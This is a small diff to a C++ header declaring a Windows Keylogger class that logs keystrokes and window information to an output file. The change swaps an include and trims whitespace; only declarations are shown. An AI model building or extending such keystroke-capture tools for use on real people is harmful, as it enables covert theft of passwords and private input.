@@ -2,7 +2,7 @@
 #define KEYLOGGER_H
 
 #include <Windows.h>
-#include <sstream>
+#include <fstream>
 
 #include "windows_info.h"
 #include "hook_manager.h"
@@ -12,7 +12,7 @@
 class Keylogger {
 public:
     Keylogger(std::ofstream&& outputFile, OSManager& manager, HookManager& hookManager, WindowInfo& windowInfo, KeyInput& keyInput);
-    
+
     int LogKeyStroke(int keyStroke);
 
 private:
